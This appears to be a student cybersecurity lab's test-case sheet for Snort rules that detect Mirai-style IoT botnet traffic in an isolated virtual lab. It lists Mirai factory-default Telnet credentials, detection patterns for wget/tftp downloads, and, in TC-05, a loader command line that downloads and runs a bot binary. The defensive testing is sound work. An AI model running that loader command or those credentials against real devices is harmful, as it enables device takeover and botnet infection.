# Test Cases — Snort Rules for IoT Botnet Attacks

> **Project :** CSL-I09 B.Tech Cyber Security Lab Mini Project
> **Student  :** Kushal Kumar | Roll No.: 23ESKCY026
> **Institute:** Swami Keshvanand Institute of Technology (SKIT), Jaipur
> **Faculty  :** [Faculty Guide Name]
> **Date     :** November 2026

---

## Network Topology Reference

| Node | IP Address | Role |
|------|-----------|------|
| Admin Workstation | 192.168.56.5 | Legitimate user (source of normal traffic) |
| IoT IP Camera | 192.168.56.10 | Target device (Telnet 23/2323, HTTP 80, SSH 22) |
| MQTT Gateway | 192.168.56.11 | Smart home gateway (port 1883) |
| Mirai Bot / Attacker | 192.168.56.100 | Simulated botnet node / brute-force origin |
| Port Scanner | 192.168.56.105 | Secondary attacker performing vertical scans |

---

## Test Case Matrix

| TC ID | Name | Category | Expected Result |
|-------|------|----------|----------------|
| TC-01 | Normal Baseline | Negative (no alert) | No IoT SIDs fired |
| TC-02 | Telnet SYN Scan | Positive | SID 1000001, 1000002, 1000008 |
| TC-03 | Telnet Brute-Force with "root" | Positive | SID 1000001, 1000003 |
| TC-04 | Mirai Factory Credentials | Positive | SID 1000004, 1000005 |
| TC-05 | Mirai Post-Auth Loader | Positive | SID 1000006, 1000007 |
| TC-06 | Vertical Port Scan | Positive | SID 1000008 |
| TC-07 | Encrypted SSH | Negative (no alert) | No SIDs fired |

---

## TC-01 — Normal Baseline Traffic (Negative Test)

### Objective
Verify that **legitimate administrative traffic** does not generate any false-positive IoT botnet alerts. The IDS must achieve zero false positives under normal operating conditions.

### Preconditions
- Snort running with `config/snort.conf` and `rules/local.rules`
- HOME_NET set to `192.168.56.0/24`
- Results directory writable
- tc01_normal_http.pcap available in `captures/`

### Steps
1. Start Snort in IDS mode: `snort -c config/snort.conf -r captures/tc01_normal_http.pcap -A fast -l results/`
2. Alternatively, run `python3 src/alert_analyzer.py` which analyses all PCAPs automatically.
3. Wait for analysis to complete.
4. Open `results/alert.ids` and `results/detection_summary.json`.
5. Filter for SIDs in range 1000001–1000010 for traffic from `192.168.56.5`.

### Input PCAP
- **File:** `captures/tc01_normal_http.pcap`
- **Source IP:** 192.168.56.5 (Admin Workstation)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Port:** TCP / 80 (HTTP)
- **Content:** Standard HTTP GET request (`GET /index.html HTTP/1.1`)
- **Packet Count:** ~10 packets (3-way handshake + HTTP exchange + FIN)

### Expected Alerts (SIDs)
*None* — SIDs 1000001–1000010 must **NOT** fire for this traffic.

### Results Table

| Field | Value |
|-------|-------|
| **Actual Alerts Fired** | _(leave blank — fill during lab execution)_ |
| **Alert Count** | _(fill during lab)_ |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc01` |
| **Wireshark Filter** | `ip.src == 192.168.56.5 and tcp.port == 80` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-02 — Telnet SYN Scan

### Objective
Verify that a rapid sequence of TCP SYN packets targeting Telnet ports 23 and 2323 triggers the port-scan and Telnet-attempt detection rules, simulating the initial scan phase of Mirai propagation.

### Preconditions
- SID 1000001 (Telnet port 23), SID 1000002 (port 2323), SID 1000008 (SYN scan) must be active.
- `detection_filter` for SID 1000008 configured as: `track by_src, count 20, seconds 5`.
- tc02_telnet_syn_scan.pcap available in `captures/`.

### Steps
1. Run: `snort -c config/snort.conf -r captures/tc02_telnet_syn_scan.pcap -A fast -l results/`
2. OR: `python3 src/alert_analyzer.py` (batch mode).
3. Check `results/alert.ids` for SID 1000001, 1000002, 1000008.
4. Count alert occurrences and record in results table below.

### Input PCAP
- **File:** `captures/tc02_telnet_syn_scan.pcap`
- **Source IP:** 192.168.56.100 (Attacker)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Ports:** TCP / 23 (15 SYNs) + TCP / 2323 (10 SYNs) = 25 total SYNs
- **TCP Flags:** SYN only (`0x02`)
- **Rate:** All 25 SYNs within a 3-second window

### Expected Alerts (SIDs)
| SID | Rule Message | Min. Occurrences |
|-----|-------------|-----------------|
| 1000001 | Telnet connection attempt to IoT device port 23 | ≥ 1 |
| 1000002 | Telnet connection attempt on alt-port 2323 (Mirai-style) | ≥ 1 |
| 1000008 | TCP SYN port scan detected | ≥ 1 |

### Results Table

| Field | Value |
|-------|-------|
| **SID 1000001 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **SID 1000002 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **SID 1000008 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **Alert Count** | _(fill during lab)_ |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc02` |
| **Wireshark Filter** | `tcp.flags.syn == 1 and tcp.flags.ack == 0` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-03 — Telnet Brute-Force with Username "root"

### Objective
Verify that SID 1000003 fires when the payload of a Telnet session contains the string "root", simulating the credential brute-force phase where Mirai tries common factory usernames.

### Preconditions
- SID 1000001 (Telnet port 23 connection) active.
- SID 1000003 (content:"root" nocase, within:50) active.
- Stream5 reassembly configured for port 23 to allow content inspection on session data.
- tc03_brute_force_root.pcap available in `captures/`.

### Steps
1. Run Snort or alert_analyzer against `captures/tc03_brute_force_root.pcap`.
2. Check `results/alert.ids` for SID 1000003.
3. Optionally open PCAP in Wireshark and filter: `tcp.port == 23 and data` — confirm payload contains "root".

### Input PCAP
- **File:** `captures/tc03_brute_force_root.pcap`
- **Source IP:** 192.168.56.100 (Attacker)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Port:** TCP / 23 (Telnet)
- **Payload Strings:** `"root\r\n"` repeated multiple times with varying passwords

### Expected Alerts (SIDs)
| SID | Rule Message | Min. Occurrences |
|-----|-------------|-----------------|
| 1000001 | Telnet connection attempt to IoT device port 23 | ≥ 1 |
| 1000003 | Mirai Telnet brute-force username root detected | ≥ 1 |

### Results Table

| Field | Value |
|-------|-------|
| **SID 1000001 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **SID 1000003 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc03` |
| **Wireshark Filter** | `tcp.port == 23 and frame contains "root"` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-04 — Mirai Factory Default Credentials

### Objective
Verify detection of Mirai's well-known factory-default credential strings `"xc3511"` (SID 1000004) and `"vizxv"` (SID 1000005) within Telnet session payloads.

### Preconditions
- SID 1000004 (content:"xc3511" nocase) and SID 1000005 (content:"vizxv" nocase) active.
- Stream5 reassembly enabled for port 23.
- tc04_factory_creds.pcap available in `captures/`.

### Steps
1. Run analysis on `captures/tc04_factory_creds.pcap`.
2. Confirm `results/alert.ids` contains SID 1000004 and/or 1000005.
3. Wireshark: filter `tcp.port == 23 and (frame contains "xc3511" or frame contains "vizxv")`.

### Input PCAP
- **File:** `captures/tc04_factory_creds.pcap`
- **Source IP:** 192.168.56.100 (Attacker)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Port:** TCP / 23 (Telnet)
- **Payload Strings:** `"root\r\nxc3511\r\n"` and `"root\r\nvizxv\r\n"` in separate attempts

### Expected Alerts (SIDs)
| SID | Rule Message | Min. Occurrences |
|-----|-------------|-----------------|
| 1000004 | Mirai factory credential root:xc3511 | ≥ 1 |
| 1000005 | Mirai factory credential root:vizxv | ≥ 1 |

### Results Table

| Field | Value |
|-------|-------|
| **SID 1000004 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **SID 1000005 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc04` |
| **Wireshark Filter** | `frame contains "xc3511" or frame contains "vizxv"` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-05 — Mirai Post-Authentication Loader

### Objective
Verify detection of Mirai's post-login shell commands: the `"/bin/busybox MIRAI"` string (SID 1000006) and the `wget`/`tftp` download vector (SID 1000007), simulating the bot payload delivery phase.

### Preconditions
- SID 1000006 (content:"/bin/busybox"; content:"MIRAI"; distance:0; within:30) active.
- SID 1000007 (pcre:"/\/(wget|tftp)\s+http/i") active.
- tc05_post_auth_loader.pcap available in `captures/`.

### Steps
1. Run analysis on `captures/tc05_post_auth_loader.pcap`.
2. Verify SID 1000006 and 1000007 appear in `results/alert.ids`.
3. Wireshark: filter `frame contains "busybox" or frame contains "wget"`.

### Input PCAP
- **File:** `captures/tc05_post_auth_loader.pcap`
- **Source IP:** 192.168.56.100 (Attacker)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Port:** TCP / 23 (post-auth Telnet shell)
- **Payload Strings:**
  - `/bin/busybox MIRAI`
  - `wget http://192.168.56.100/bot.arm7 -O /tmp/m && chmod +x /tmp/m && /tmp/m`

### Expected Alerts (SIDs)
| SID | Rule Message | Min. Occurrences |
|-----|-------------|-----------------|
| 1000006 | Mirai post-auth loader /bin/busybox MIRAI | ≥ 1 |
| 1000007 | Mirai wget/tftp download command | ≥ 1 |

### Results Table

| Field | Value |
|-------|-------|
| **SID 1000006 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **SID 1000007 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc05` |
| **Wireshark Filter** | `frame contains "/bin/busybox" or frame contains "wget"` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-06 — Vertical Port Scan

### Objective
Verify that SID 1000008 (TCP SYN scan rule) fires when a single source sends SYN packets to many different ports on the target, simulating reconnaissance before botnet infection.

### Preconditions
- SID 1000008 with `detection_filter: track by_src, count 20, seconds 5` active.
- tc06_port_scan.pcap available in `captures/`.

### Steps
1. Run analysis on `captures/tc06_port_scan.pcap`.
2. Confirm SID 1000008 appears in `results/alert.ids`.
3. Wireshark: filter `ip.src == 192.168.56.105 and tcp.flags.syn == 1 and tcp.flags.ack == 0`.

### Input PCAP
- **File:** `captures/tc06_port_scan.pcap`
- **Source IP:** 192.168.56.105 (Port Scanner)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol:** TCP — SYN flags only
- **Ports Scanned:** 22, 23, 80, 443, 1883, 2323, 8080, 8443, 8888, … (25+ ports within 4 seconds)

### Expected Alerts (SIDs)
| SID | Rule Message | Min. Occurrences |
|-----|-------------|-----------------|
| 1000008 | TCP SYN port scan detected | ≥ 1 |

### Results Table

| Field | Value |
|-------|-------|
| **SID 1000008 Fired?** | ⬜ YES &nbsp;&nbsp; ⬜ NO |
| **Alert Count** | _(fill during lab)_ |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc06` |
| **Wireshark Filter** | `ip.src == 192.168.56.105 and tcp.flags == 0x002` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## TC-07 — Encrypted SSH Session (Negative Test)

### Objective
Verify that encrypted SSH traffic on port 22 does **not** trigger any Telnet or IoT botnet rules (SIDs 1000001–1000010). SSH uses binary encrypted payloads that must not match Telnet or Mirai content patterns.

### Preconditions
- tc07_encrypted_ssh.pcap available in `captures/`.
- Snort stream5 configured to track TCP port 22 but NOT apply Telnet content rules to it.
- Rules SID 1000001–1000010 must specify `flow` or port restrictions that exclude port 22 traffic.

### Steps
1. Run analysis on `captures/tc07_encrypted_ssh.pcap`.
2. Open `results/alert.ids` and `results/detection_summary.json`.
3. Confirm **no** SID in range 1000001–1000010 fires for `192.168.56.5` → `192.168.56.10:22`.

### Input PCAP
- **File:** `captures/tc07_encrypted_ssh.pcap`
- **Source IP:** 192.168.56.5 (Admin Workstation)
- **Destination IP:** 192.168.56.10 (IoT Camera)
- **Protocol / Port:** TCP / 22 (SSH)
- **Content:** SSH banner exchange followed by encrypted binary payload (simulated TLS-like bytes)

### Expected Alerts (SIDs)
*None* — SIDs 1000001–1000010 must **NOT** fire for port-22 SSH traffic.

### Results Table

| Field | Value |
|-------|-------|
| **Any IoT SID Fired?** | ⬜ YES (FAIL) &nbsp;&nbsp; ⬜ NO (PASS) |
| **SIDs Observed** | _(list if any)_ |
| **Pass / Fail** | ⬜ PASS &nbsp;&nbsp; ⬜ FAIL |
| **Evidence File** | `results/detection_summary.json` → key `tc07` |
| **Wireshark Filter** | `tcp.port == 22` |
| **Tester Signature** | _________________ |
| **Date Tested** | _________________ |

---

## Aggregate Pass/Fail Sign-Off

| TC | Name | Pass | Fail | Date | Tester |
|----|------|------|------|------|--------|
| TC-01 | Normal Baseline | ☐ | ☐ | | |
| TC-02 | Telnet SYN Scan | ☐ | ☐ | | |
| TC-03 | Brute-Force root | ☐ | ☐ | | |
| TC-04 | Factory Credentials | ☐ | ☐ | | |
| TC-05 | Post-Auth Loader | ☐ | ☐ | | |
| TC-06 | Vertical Port Scan | ☐ | ☐ | | |
| TC-07 | Encrypted SSH | ☐ | ☐ | | |

---

*All testing performed within an isolated VirtualBox lab environment for academic purposes only.*
